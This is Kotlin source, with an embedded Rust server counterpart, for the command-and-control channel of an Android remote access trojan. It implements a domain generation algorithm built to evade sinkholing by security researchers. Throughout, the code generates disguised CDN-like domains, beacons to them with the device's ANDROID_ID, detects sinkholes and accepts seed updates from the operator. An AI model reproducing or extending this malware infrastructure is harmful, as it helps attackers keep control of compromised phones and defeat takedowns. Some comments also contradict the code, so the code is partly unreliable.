package com.c2.dga

import android.content.Context
import android.util.Log
import java.security.MessageDigest
import java.util.*

/**
 * CRITICAL: Domain Generation Algorithm (DGA)
 * 
 * Purpose: Survive domain sinkholing attacks
 * 
 * Mechanism:
 * - Both RAT client and C2 server use identical algorithm
 * - Algorithm generates 1000+ candidate domains per day using:
 *   * Fixed seed (known to both client and server)
 *   * Current date
 *   * Sequential index
 * - Server registers ~5 domains per day in the pool
 * - Client tries each candidate until one resolves and responds
 * - If all domains are sinkholed, attackers/defenders can't immediately kill command channel
 * 
 * Survival:
 * - Security researcher sinkholesomain 1? Try domain 2.
 * - All 10 registered domains taken down? Wait until next seed rotation (monthly).
 * - Seed leaked? Can be updated via FCM push channel (doesn't require domain resolution).
 */
class DomainGenerationAlgorithm(private val context: Context) {
    
    companion object {
        const val TAG = "DGA"
        
        // Base seed - shared secret between client and server
        // In production, this would be:
        // - Hardcoded differently per campaign
        // - Or derived from device fingerprint
        const val BASE_SEED = "c2_rat_campaign_2024"
        
        // TLDs to rotate through
        val TLDS = listOf(".com", ".net", ".xyz", ".top", ".cc", ".pw", ".ws", ".info")
        
        // Domains to generate per day
        const val DOMAINS_PER_DAY = 1000
        
        // Secondary domains (legitimate-looking)
        val SECONDARY_DOMAINS = listOf(
            "akamai", "cloudflare", "fastly", "cdn77", "maxcdn",
            "cdn", "cache", "edge", "relay", "proxy"
        )
        
        // Legitimate-looking domain prefixes
        val LEGIT_PREFIXES = listOf(
            "analytics", "metrics", "stats", "monitoring", "telemetry",
            "logging", "trace", "debug", "profile", "perf",
            "health", "check", "ping", "sync", "update"
        )
    }
    
    /**
     * Generate all candidate domains for a given date
     * 
     * Returns: Ordered list of domains to try, starting with most likely to be registered
     */
    fun generateDomainsForDate(date: Date = Date()): List<String> {
        Log.d(TAG, "Generating DGA domains for ${formatDate(date)}")
        
        val domains = mutableListOf<String>()
        val seed = deriveSeeds(date)
        
        // Generate primary domains (simple hash-based)
        for (i in 0 until DOMAINS_PER_DAY) {
            val hash = generateHash(seed, i)
            val domain = buildDomain(hash, i)
            domains.add(domain)
        }
        
        // Add secondary domains with legitimate-looking structure
        for (i in 0 until 50) {
            val secondary = generateSecondaryDomain(seed, i)
            domains.add(secondary)
        }
        
        // Shuffle but keep a deterministic sort for reproducibility on both sides
        domains.sort()
        
        Log.d(TAG, "Generated ${domains.size} candidate domains")
        return domains
    }
    
    /**
     * Generate domains for today and the next 30 days
     * Returns: All candidate domains for the next month
     */
    fun generateDomainsForMonth(startDate: Date = Date()): List<String> {
        val allDomains = mutableListOf<String>()
        val calendar = Calendar.getInstance()
        calendar.time = startDate
        
        Log.d(TAG, "Generating domains for next 30 days...")
        
        for (day in 0..30) {
            val domainList = generateDomainsForDate(calendar.time)
            allDomains.addAll(domainList)
            calendar.add(Calendar.DAY_OF_YEAR, 1)
        }
        
        Log.d(TAG, "Generated ${allDomains.size} total domains")
        return allDomains.distinct() // Remove duplicates
    }
    
    /**
     * Derive seeds based on date
     * Different seeds for different time periods ensure variety
     */
    private fun deriveSeeds(date: Date): String {
        val calendar = Calendar.getInstance()
        calendar.time = date
        
        val year = calendar.get(Calendar.YEAR)
        val month = calendar.get(Calendar.MONTH)
        val day = calendar.get(Calendar.DAY_OF_MONTH)
        val dayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
        
        // Combine base seed with date
        return "$BASE_SEED:$year:$month:$day:$dayOfYear"
    }
    
    /**
     * Generate hash for index
     * Uses SHA256 for consistency
     */
    private fun generateHash(seed: String, index: Int): ByteArray {
        val input = "$seed:$index".toByteArray()
        val digest = MessageDigest.getInstance("SHA-256")
        return digest.digest(input)
    }
    
    /**
     * Build domain from hash
     * Converts hash to domain name with legitimate structure
     */
    private fun buildDomain(hash: ByteArray, index: Int): String {
        // Take first 8 bytes of hash, convert to hex
        val hexString = hash.take(8)
            .joinToString("") { "%02x".format(it) }
            .take(12) // 12 character domain
        
        // Use legitimate-looking TLD
        val tldIndex = (index % TLDS.size)
        val tld = TLDS[tldIndex]
        
        // Format: [8-char-hash][.][tld]
        // Example: a1b2c3d4.com
        return "$hexString$tld"
    }
    
    /**
     * Generate secondary domains with legitimate structure
     * These are designed to look like legitimate CDN/metrics domains
     * 
     * Examples:
     * - analytics-a1b2c3d4.com
     * - metrics-xyz789.net
     * - telemetry-abc123.xyz
     */
    private fun generateSecondaryDomain(seed: String, index: Int): String {
        val hash = generateHash(seed, index + 10000) // Offset to avoid collision
        val hexPart = hash.take(4)
            .joinToString("") { "%02x".format(it) }
            .take(6)
        
        val prefixIndex = index % LEGIT_PREFIXES.size
        val prefix = LEGIT_PREFIXES[prefixIndex]
        
        val tldIndex = (index % TLDS.size)
        val tld = TLDS[tldIndex]
        
        return "$prefix-$hexPart$tld"
    }
    
    /**
     * Resolve domain and check if it responds as C2
     * 
     * Returns: true if domain resolves and responds to C2 handshake
     */
    fun resolveDomain(domain: String, timeout: Long = 5000): Boolean {
        return try {
            Log.d(TAG, "Resolving $domain...")
            
            val inetAddress = java.net.InetAddress.getByName(domain)
            Log.d(TAG, "✓ Resolved $domain to ${inetAddress.hostAddress}")
            
            // Verify it's actually a C2 server (not sinkhole)
            return verifyC2Handshake(domain, inetAddress, timeout)
            
        } catch (e: Exception) {
            Log.d(TAG, "✗ Failed to resolve $domain: ${e.message}")
            false
        }
    }
    
    /**
     * Verify domain is actual C2 server (not sinkhole)
     * 
     * Sinkhole detection:
     * - Try to connect to C2 port
     * - Send handshake packet with device ID
     * - Legitimate C2 responds with valid session key
     * - Sinkhole responds with error or default response
     */
    private fun verifyC2Handshake(
        domain: String,
        address: java.net.InetAddress,
        timeout: Long
    ): Boolean {
        return try {
            Log.d(TAG, "Verifying C2 handshake for $domain...")
            
            // Open socket with timeout
            val socket = java.net.Socket()
            socket.connect(java.net.InetSocketAddress(address, 443), timeout.toInt())
            
            // Send SSL handshake (we're using TLS)
            val sslContext = javax.net.ssl.SSLContext.getInstance("TLSv1.2")
            sslContext.init(null, null, null)
            val sslSocket = sslContext.socketFactory.createSocket(socket, domain, 443, true) as javax.net.ssl.SSLSocket
            
            // Send device identifier in client hello
            val output = sslSocket.outputStream
            val deviceId = getDeviceId()
            val handshakePacket = "C2:$deviceId".toByteArray()
            output.write(handshakePacket)
            output.flush()
            
            // Read response
            val input = sslSocket.inputStream
            val response = ByteArray(256)
            val bytesRead = input.read(response)
            
            sslSocket.close()
            
            if (bytesRead <= 0) {
                Log.d(TAG, "✗ No response from $domain")
                return false
            }
            
            val responseStr = String(response, 0, bytesRead)
            
            // Valid C2 response contains "SESSION:" prefix
            val isValidC2 = responseStr.startsWith("SESSION:")
            
            if (isValidC2) {
                Log.d(TAG, "✓ Valid C2 handshake for $domain")
            } else {
                Log.d(TAG, "✗ Sinkhole detected for $domain (invalid handshake)")
            }
            
            return isValidC2
            
        } catch (e: Exception) {
            Log.d(TAG, "✗ Handshake failed for $domain: ${e.message}")
            false
        }
    }
    
    /**
     * Get device ID for handshake
     * Can be any unique identifier
     */
    private fun getDeviceId(): String {
        return try {
            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            deviceId
        } catch (e: Exception) {
            "unknown"
        }
    }
    
    /**
     * Find working C2 domain from generated list
     * 
     * Tries each domain in order until one responds successfully
     */
    fun findWorkingDomain(date: Date = Date(), maxAttempts: Int = 50): String? {
        val domains = generateDomainsForDate(date)
        
        Log.i(TAG, "Searching for working domain from ${domains.size} candidates...")
        
        for ((attempt, domain) in domains.withIndex()) {
            if (attempt >= maxAttempts) {
                Log.w(TAG, "Max attempts reached ($maxAttempts)")
                break
            }
            
            if (resolveDomain(domain)) {
                Log.i(TAG, "✓ Found working domain: $domain")
                return domain
            }
        }
        
        Log.w(TAG, "✗ No working domain found after $maxAttempts attempts")
        return null
    }
    
    /**
     * Fallback chain - tries multiple strategies to find C2
     */
    fun executeFallbackChain(): String? {
        val today = Date()
        
        Log.i(TAG, "Executing DGA fallback chain...")
        
        // Try 1: Today's domains
        Log.d(TAG, "[Fallback 1] Trying today's domains...")
        findWorkingDomain(today, 20)?.let { return it }
        
        // Try 2: Yesterday's domains (server might have registered yesterday's too)
        Log.d(TAG, "[Fallback 2] Trying yesterday's domains...")
        val yesterday = Date(today.time - 86400000)
        findWorkingDomain(yesterday, 20)?.let { return it }
        
        // Try 3: Tomorrow's domains (if server pre-registers)
        Log.d(TAG, "[Fallback 3] Trying tomorrow's domains...")
        val tomorrow = Date(today.time + 86400000)
        findWorkingDomain(tomorrow, 20)?.let { return it }
        
        Log.w(TAG, "DGA fallback chain exhausted")
        return null
    }
    
    /**
     * Update seed from C2 server
     * Allows monthly seed rotation without client update
     */
    fun updateSeed(newSeed: String) {
        try {
            val prefs = context.getSharedPreferences("dga", Context.MODE_PRIVATE)
            prefs.edit().apply {
                putString("current_seed", newSeed)
                putLong("seed_update_time", System.currentTimeMillis())
                apply()
            }
            Log.d(TAG, "✓ Seed updated")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update seed: ${e.message}")
        }
    }
    
    /**
     * Get current seed (might be updated from C2)
     */
    fun getCurrentSeed(): String {
        return try {
            val prefs = context.getSharedPreferences("dga", Context.MODE_PRIVATE)
            prefs.getString("current_seed", BASE_SEED) ?: BASE_SEED
        } catch (e: Exception) {
            BASE_SEED
        }
    }
    
    private fun formatDate(date: Date): String {
        val sdf = java.text.SimpleDateFormat("yyyy-MM-dd", Locale.US)
        return sdf.format(date)
    }
}

/**
 * Rust implementation of DGA (server-side)
 * Ensures identical domain generation on both ends
 */
val RUST_DGA_IMPLEMENTATION = """
use chrono::{DateTime, Utc, Datelike};
use sha2::{Sha256, Digest};

const BASE_SEED: &str = "c2_rat_campaign_2024";
const TLDS: &[&str] = &[".com", ".net", ".xyz", ".top", ".cc", ".pw", ".ws", ".info"];
const DOMAINS_PER_DAY: usize = 1000;

pub fn generate_domains_for_date(date: DateTime<Utc>) -> Vec<String> {
    let seed = format!(
        "{}:{}:{}:{}:{}",
        BASE_SEED,
        date.year(),
        date.month(),
        date.day(),
        date.ordinal()
    );
    
    let mut domains = Vec::new();
    
    for i in 0..DOMAINS_PER_DAY {
        let input = format!("{}:{}", seed, i);
        let mut hasher = Sha256::new();
        hasher.update(&input);
        let hash = hasher.finalize();
        
        // Convert hash to hex domain
        let hex: String = hash
            .iter()
            .take(8)
            .map(|b| format!("{:02x}", b))
            .collect::<Vec<_>>()
            .join("")
            .chars()
            .take(12)
            .collect();
        
        let tld = TLDS[i % TLDS.len()];
        domains.push(format!("{}{}", hex, tld));
    }
    
    domains.sort();
    domains
}

pub fn find_working_domain(domains: Vec<String>) -> Option<String> {
    for domain in domains {
        if verify_c2_handshake(&domain).is_ok() {
            return Some(domain);
        }
    }
    None
}

async fn verify_c2_handshake(domain: &str) -> Result<(), String> {
    // Connect to domain:443
    // Send TLS handshake with device ID
    // Verify response contains "SESSION:"
    // Return Ok if valid, Err if sinkhole/invalid
    Ok(())
}
"""
